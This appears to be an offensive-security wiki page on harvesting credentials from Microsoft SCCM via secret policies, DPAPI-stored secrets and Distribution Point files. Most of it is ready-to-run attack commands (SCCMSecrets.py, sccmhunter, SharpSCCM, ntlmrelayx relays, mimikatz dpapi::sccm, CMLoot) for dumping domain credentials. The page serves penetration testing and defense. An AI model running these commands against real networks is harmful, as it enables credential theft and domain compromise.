---
authors: BlWasp, ShutdownRepo, q-roland, felixbillieres
category: ad
---

# Credential harvesting

## Theory

For more details on this subject, see [this Synacktiv article](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial#part_2).

[This blogpost](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/) also contains useful information on the topic.

> [!TIP]
> For additional attack techniques and defense strategies related to credential harvesting in SCCM, refer to the following techniques from the [Misconfiguration-Manager repository](https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques):
> - [CRED-1: PXE Credentials](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md)
> - [CRED-2: Policy Request Credentials](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-2/cred-2_description.md)
> - [CRED-3: DPAPI Credentials](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-3/cred-3_description.md)
> - [CRED-4: Legacy Credentials](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-4/cred-4_description.md)
> - [CRED-5: Site Database Credentials](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-5/cred-5_description.md)
> - [CRED-6: Looting Distribution Points](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-6/cred-6_description.md)
> - [CRED-7: AdminService API Credentials](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-7/cred-7_description.md)
> - [CRED-8: Policy Creds MP Relay](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-8/cred-8_description.md)

An SCCM infrastructure may contain a wide range of cleartext credentials accessible from various levels of privileges. Some credentials can be associated with privileged accounts in the domain. From a privilege escalation perspective, we are interested in secrets retrievable using an SCCM client or a low-privilege account in the domain.

### Secret policies: Network Access Accounts (NAAs), Task sequences and Collection variables

Some policies may contain sensitive data and are tagged as **secret policies**. Only registered SCCM devices in the **approved** state may request them. By default in SCCM, two device registration endpoints are available on the Management Point (MP): `http://<MP>/ccm_system/request` and `http://<MP>/ccm_system_windowsauth/request`. The first one is unauthenticated, meaning that anyone can generate a self-signed certificate and register an arbitrary device; however, by default, devices registered through this endpoint are **not** approved, which means that they cannot request secret policies. The second endpoint is authenticated and requires credentials for a domain computer account; devices registered through this endpoint are, by default, **automatically approved**.

> [!TIP]
> This concretely means that an attacker that has a machine account or that is able to relay one can register an approved device and dump secret policies. Also, note that **it is possible for sysadmins to misconfigure SCCM** in order to automatically approve any device registering through the unauthenticated registration endpoint. In that case, an unauthenticated attacker on the network could dump secret policies.

Three kinds of policies are tagged as secret and can contain credentials:

* **Network Access Accounts (NAAs)**: NAAs are manually created domain accounts used to retrieve data from the SCCM Distribution Point (DP) if the machine cannot use its machine account. Typically, when a machine has not yet been registered in the domain. NAA does not need to be privileged on the domain, but it can happen that administrators give too many privileges to these accounts. NAA credentials are distributed via secret policies.
* **Task sequences**: Task sequences are automated workflows that can be deployed by administrators on client devices and that will execute a series of steps. [Various task sequence steps](https://www.mwrcybersec.com/an-inside-look-how-to-distribute-credentials-securely-in-sccm) require or give the possibility to the administrator to provide domain credentials in order to execute them. They are distributed via secret policies.
* **Collection variables**: In SCCM, it is possible to associate variables to specific collections of devices. These variables can be used to customize deployments, scripts, or configurations for all members of the collection. They may contain credentials and are distributed via secret policies.

Note that the SCCM Management Point may be hardened and configured to enforce the use of **HTTPS** for client interaction. When this is the case, **client certificate authentication** with a domain PKI client certificate will be required by the Management Point.

### Distribution Points resources

Policies may reference external resources hosted on a **Distribution Point**. These resources may be applications, OS images, but also configuration files, PowerShell scripts, certificates, or other kind of file susceptible to contain sensitive technical information such as credentials.

Distribution Point primarily distributes resources via SMB and HTTP. By default, valid domain credentials must be provided to access hosted resources.

> [!TIP]
> This concretely means that an attacker with any domain account can fetch Distribution Point resources. In addition, **it is possible for sysadmins to misconfigure SCCM Distribution Points** to allow anonymous access to resources. Note that anonymous access only works with the HTTP protocol, and retrieving Distribution Point resources via SMB always requires authentication, even with anonymous access configured.

SCCM Distribution Points may also be configured to enforce the use of **HTTPS**. Again, when this is the case, **client certificate authentication** will be required by the Distribution Point with a domain PKI client certificate.

## Practice

As noted in the [Theory section](#theory), secrets can be harvested from SCCM secret policies, or Distribution Point resources.

### Secret SCCM policies

Only **approved SCCM devices** can fetch secret policies. It is first possible to **register a device ourselves** by providing domain machine account credentials (or exploiting automatic device approval).

::: tabs

=== UNIX-based

To this end, [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets/) (Python) can be used. All secret policies associated with the default collections for the newly registered device (including NAAs, Task sequences and collection variables) will be dumped. This tool also supports HTTPS / client certificate authentication.

```bash
# Plain HTTP
python3 SCCMSecrets.py policies -mp "http://$MP_IP" -u "$MACHINE_NAME" -p "$MACHINE_PASSWORD" -cn "newdevice"

# HTTPS with client certificate
python3 SCCMSecrets.py policies -mp https://$MP_IP -u '$MACHINE_NAME' -p '$MACHINE_PASSWORD' -cn 'newdevice' --pki-cert ./cert.pem --pki-key ./key.pem
```

Note that if you do not provide machine account credentials, `SCCMSecrets.py` will use the unauthenticated registration endpoint in order to attempt exploiting automatic device approval.

This attack is also possible via NTLM relay if you are able to relay the authentication data of a domain machine account.
```bash
python3 examples/ntlmrelayx.py -t 'http://mecm.sccm.lab/ccm_system_windowsauth/request' -smb2support --sccm-policies -debug
```

Finally, this attack was first inspired by @xpn_'s work (refer to [this blogpost](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)). The tool associated with the blogpost, [sccmwtf](https://github.com/xpn/sccmwtf) (Python), is available on Github. It can be used to perform the attack, however with two limitations: it will only dump the NAA secret policy, and it might fail on recent SCCM installations since the encryption algorithm changed.

The [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) tool also implements `sccmwtf`, but with the same limitations.
```bash
#Create a new computer account and request the policies
python3 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -auto

#To use an already controlled computer account
python3 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -cn $COMPUTER_NAME -cp $COMPUTER_PASSWORD -dc-ip $DC_IP
```

=== Windows-based

On Windows, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can be used to register a device and dump secret policies. All secret policies associated with the default collections for the newly registered device (including NAAs, Task sequences and collection variables) will be dumped.

```powershell
.\SharpSCCM.exe get secrets -r newdevice -u $MACHINE_NAME -p $PASSWORD
```

:::

Instead of registering a new device, it is also possible to **use an already compromised SCCM device** in order to dump secret policies. Note that this can also be interesting as the compromised device may be part of specific device collections associated with more task sequences or collection variables than the default collections we dumped by registering a device ourselves.

::: tabs

=== Unix-based

In order to use a compromised SCCM device, it is first necessary to **extract the SCCM certificates** from the machine. More details on how to do this [here](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial#part_4).

With the SCCM device private key and GUID, [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets/) (Python) can be used to impersonate the device and dump secret policies (in the example below, the `compromised_device/` folder contains the `key.pem` and `guid.txt` files).

All secret policies associated with the compromised device's collections (including NAAs, Task sequences and collection variables) will be dumped.

```bash
# Plain HTTP
python3 SCCMSecrets.py policies -mp http://$MP_IP --use-existing-device compromised_device/

# HTTPS with client certificate authentication
python3 SCCMSecrets.py policies -mp http://$MP_IP --use-existing-device compromised_device/ --pki-cert cert.pem --pki-key key.pem
```

=== Windows-based

From a local administrator access on the machine of a compromised SCCM device, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can be executed to use the local SCCM device and dump secret policies.

All secret policies associated with the compromised device's collections (including NAAs, Task sequences and collection variables) will be dumped.

```powershell
.\SharpSCCM.exe get secrets
```

:::

Finally, it should be mentioned that SCCM policies secrets (NAA, Task Sequences, Collection variables) are stored on the disk of SCCM clients, encrypted with DPAPI. Interestingly enough regarding NAA, even after deleting or changing the NAA in the SCCM configuration, the binary file still contains the encrypted credentials on the enrolled computers (see [this SpecterOps article](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)). The same behaviour can be observed for Task sequences and Collection variables.

As a result, it is possible to retrieve policies secrets **locally** on compromised devices.

::: tabs

=== UNIX-based

Using a local administrator account, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) (Python) can be used to fetch and decrypt SCCM policies secrets locally, as well as [sccmhunter.py](https://github.com/garrettfoster13/sccmhunter) (Python).

```bash
SystemDPAPIdump.py -creds -sccm $DOMAIN/$USER:$PASSWORD@target.$DOMAIN
```

```bash
python3 sccmhunter.py dpapi -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -target $TARGET -wmi
```

=== Windows-based

With administrative access to a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#), [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) (C#), [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) or native PowerShell can be used to extract policies secrets locally.

```powershell
# SharpSCCM - from disk
SharpSCCM.exe local secrets disk

# SharpSCCM - from WMI
SharpSCCM.exe local secrets wmi

# SharpDPAPI
SharpDPAPI.exe SCCM

# Mimikatz
mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # dpapi::sccm

# Native Powershell
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_TaskSequence
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_CollectionVariable
```

:::

### Distribution Point resources

By default, any authenticated user can retrieve Distribution Point resources which may contain secrets.

Resources can be downloaded through the SMB or HTTP protocols.

As previously mentioned, note that if anonymous access was configured on a Distribution Point, only the HTTP protocol can be used to download files without any credentials.

::: tabs

=== UNIX-based

##### HTTP

Regarding the HTTP protocol on Unix, [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets/) (Python) can be used to index and download files from Distribution Points.

Not providing any credentials will attempt to exploit anonymous access on the Distribution Point. HTTPS and client authentication is also supported by this tool.

```bash
# Attempts to exploit anonymous access to index and download files
python3 SCCMSecrets.py files -dp http://$DP_IP

# Downloads files with specific extensions 
python3 SCCMSecrets.py files -dp http://$DP_IP -u '$USER' -H '$HASH' --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf'

# Having indexed files first, downloads specific files from the Distribution Point
python3 SCCMSecrets.py files -dp http://$DP_IP -u '$USER' -p '$PASSWORD' --urls to_download.lst

# Perform file dump attack via HTTPS and client certificate authentication
python3 SCCMSecrets.py files -dp https://$DP_IP -u '$USER' -p '$PASSWORD' --pki-cert ./cert.pem --pki-key ./key.pem
```

If anonymous access is enabled on the Distribution Point, [sccm-http-looter](https://github.com/badsectorlabs/sccm-http-looter) (Golang) can also be used. It may be faster as it is written in Golang.

```bash
./sccm-http-looter -server 10.10.10.10
```

This attack is also possible via NTLM relay if you are able to relay the authentication data of a domain account. 
```bash
python3 examples/ntlmrelayx.py -t 'http://mecm.sccm.lab/sms_dp_smspkg$/Datalib' -smb2support --sccm-dp -debug
```

##### SMB

Regarding the SMB protocol, [cmloot.py](https://github.com/shelltrail/cmloot) (Python) can be used to dump files.
```bash
# Enumerate SCCM servers, build inventory and download
python3 cmloot.py $DOMAIN/$USER@$TARGET -findsccmservers -target-file sccmhosts.txt -cmlootdownload sccmfiles.txt
```

=== Windows-based

##### SMB

On Windows, [CMLoot](https://github.com/1njected/CMLoot) (Powershell) was the original implementation of the attack in Powershell.

```powershell
# Index available files
Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt

# Download a single file
Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml

# Download all files with a specific extension
Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension ps1
```

:::

## Resources

[https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/)

[https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial)

[https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)

[https://blog.xpnsec.com/unobfuscating-network-access-accounts/](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)

[https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques/CRED](https://github.com/subat0mik/Misconfiguration-Manager/tree/main/attack-techniques/CRED)

